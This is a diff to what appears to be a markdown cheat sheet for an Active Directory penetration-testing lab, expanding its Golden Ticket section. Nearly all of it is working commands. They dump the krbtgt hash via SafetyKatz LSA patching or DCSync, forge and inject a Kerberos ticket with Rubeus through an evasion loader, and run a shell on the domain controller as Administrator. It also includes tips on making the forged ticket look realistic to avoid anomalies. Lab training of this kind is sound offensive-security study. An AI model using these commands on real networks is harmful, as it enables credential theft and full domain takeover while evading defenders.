@@ -1034,16 +1034,50 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe
 ### Golden Ticket Attack
 
 #### Prerequisites
-- krbtgt AES256 or NTLM hash
+- krbtgt AES256 or NTLM hash (via DCSync or LSADump on DC)
 - Domain SID
 - Target user and groups
+- Domain Controller FQDN
 
-#### Creation & Usage
+#### Extract krbtgt Hash
+
+**Method 1: From DC with DA privileges**
 ```powershell
-# Create golden ticket
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "lsadump::evasive-lsa /patch" "exit"
+
+# Output includes all user hashes including krbtgt
+```
+
+**Method 2: DCSync (no DC access needed)**
+```powershell
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+
+# Extract AES256, AES128, and NTLM hashes of krbtgt
+```
+
+#### Generate Golden Ticket Command with Auto-Parameters
+
+**Step 1: Use /ldap and /printcmd for automatic configuration**
+```powershell
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
   -args evasive-golden 
-    /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+    /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
+    /sid:S-1-5-21-719815819-3726368948-3917688648 
+    /ldap 
+    /user:Administrator 
+    /printcmd
+
+# /ldap queries DC for user info (logoncount, pwdlastset, groups, etc.)
+# /printcmd outputs complete command with all realistic values
+```
+
+**Step 2: Run the generated command with /ppt to inject ticket**
+```powershell
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args evasive-golden 
+    /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
     /user:Administrator 
     /id:500 
     /domain:dollarcorp.moneycorp.local 
@@ -1057,15 +1091,24 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe
     /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD 
     /ppt
 
-# Access any resource in domain
-winrs -r:dcorp-dc cmd
+# Ticket injected into current process
 ```
 
-**Key Fields:**
-- `pwdlastset`: Date krbtgt password was changed (avoid anomalies)
+#### Using Golden Ticket for DC Access
+```powershell
+# Ticket is now in Kerberos cache, can access any domain resource
+C:\AD\Tools> winrs -r:dcorp-dc cmd
+# Executes commands on DC as Administrator
+```
+
+**Key Command Parameters:**
+- `pwdlastset`: Date krbtgt password was changed (use realistic date)
 - `minpassage`: Minimum password age (typically 1)
-- `logoncount`: Realistic logon count
-- `groups`: Proper group membership (544=BUILTIN\Admins, 512=DA, etc.)
+- `logoncount`: Realistic logon count (use actual value from /ldap query)
+- `groups`: Proper group membership (544=BUILTIN\Admins, 512=DA, 520=Enterprise Admins, 513=Users)
+- `/ldap`: Automatically retrieve user info from DC
+- `/printcmd`: Output command with all parameters for review
+- `/ppt`: Inject ticket into current process (Pass-The-Ticket)
 
 ---
 
